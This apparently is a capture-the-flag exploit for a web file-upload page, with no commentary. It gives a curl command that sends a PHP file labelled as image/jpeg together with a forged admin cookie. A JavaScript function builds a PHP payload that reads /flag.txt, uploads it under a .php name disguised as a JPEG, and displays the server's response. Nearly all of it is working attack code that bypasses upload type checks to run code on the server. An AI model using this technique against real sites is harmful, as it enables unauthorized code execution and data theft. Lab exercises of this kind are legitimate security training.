


```
curl http://{IP_ADDRESS}/index.php\?page=upload \
-F "Upload=Upload" \
-F "uploaded=@test.php;type=image/jpeg" \
-F 'MAX_FILE_SIZE=100000' \
-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327'
```

OR



async function viewFullUploadResponse() {
  // Get current origin dynamically
  const baseUrl = window.location.origin;
  const uploadUrl = new URL("/index.php?page=upload", baseUrl).href;
  console.log(`[+] Target URL: ${uploadUrl}`);

  // Create PHP payload
  const phpPayload = `<?php
    $flag = file_get_contents('/flag.txt');
    echo "Flag: $flag";
    exit(0);
  ?>`;

  // Create form data for upload
  const formData = new FormData();
  const fileBlob = new Blob([phpPayload], { type: "image/jpeg" });
  const randomName = `image_${Math.floor(Math.random() * 10000)}.php`;
  formData.append("uploaded", fileBlob, randomName);
  formData.append("Upload", "Upload");
  
  console.log(`[+] Attempting to upload disguised PHP file as: ${randomName}`);
  
  try {
    // Send the upload request
    const uploadResponse = await fetch(uploadUrl, {
      method: "POST",
      body: formData
    });
    
    const responseText = await uploadResponse.text();
    
    // Display the FULL response in the console
    console.log("========== FULL SERVER RESPONSE ==========");
    console.log(responseText);
    console.log("==========================================");
    
    // Also create a new window/tab with the response for easier viewing
    const newWindow = window.open();
    newWindow.document.write(`
      <html>
        <head>
          <title>Server Response</title>
          <style>
            body { font-family: monospace; white-space: pre-wrap; }
            .highlight { background-color: yellow; }
          </style>
        </head>
        <body>
          <h2>Full Server Response</h2>
          <div>${responseText}</div>
          
          <script>
            // Add a simple search function
            const search = prompt("Enter text to highlight (or cancel for none):");
            if (search && search.length > 0) {
              const content = document.body.innerHTML;
              document.body.innerHTML = content.replace(
                new RegExp(search, 'gi'),
                '<span class="highlight">$&</span>'
              );
            }
          </script>
        </body>
      </html>
    `);
    
    return responseText;
  } catch (error) {
    console.error(`[!] Error: ${error.message}`);
  }
}

// Execute and see the full response
viewFullUploadResponse();


